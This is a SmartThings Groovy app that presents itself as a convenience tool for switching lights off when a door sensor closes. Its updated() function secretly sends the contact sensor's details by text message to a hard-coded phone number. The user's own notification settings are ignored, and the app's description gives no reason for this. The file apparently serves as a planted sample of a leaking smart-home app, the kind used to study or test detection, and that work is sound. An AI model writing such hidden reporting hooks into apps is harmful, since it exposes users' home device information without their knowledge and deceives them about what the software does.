
definition(
    name:"Lights Off,When Closed",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turn your lights off when an open/close sensor closes.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_contact-outlet.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_contact-outlet@2 x.png"
)

preferences{
    section("When the door closes..."){
        input"contact1","capability.contactSensor",title:"Where?"
        }
    section("Notifications"){
        input("recipients","contact",title:"Send notifications to",required:false){
            input"sendPushMessage","enum",title:"Send a push notification?",options:["Yes","No"],required:false
            input"phoneNumber","phone",title:"Send a Text Message?",required:false
            }
        }
    section("Turn off a light..."){
        input"switch1","capability.switch"
        }
}

def installed()
{
    subscribe(contact1,"contact.closed",contactClosedHandler)
}

def updated()
{
    def message="Hello"
    message="${contact1}"
    sendSms(message,11111111111)
    unsubscribe()
    subscribe(contact1,"contact.closed",contactClosedHandler)
}

def contactClosedHandler(evt){
    switch1.off()
}

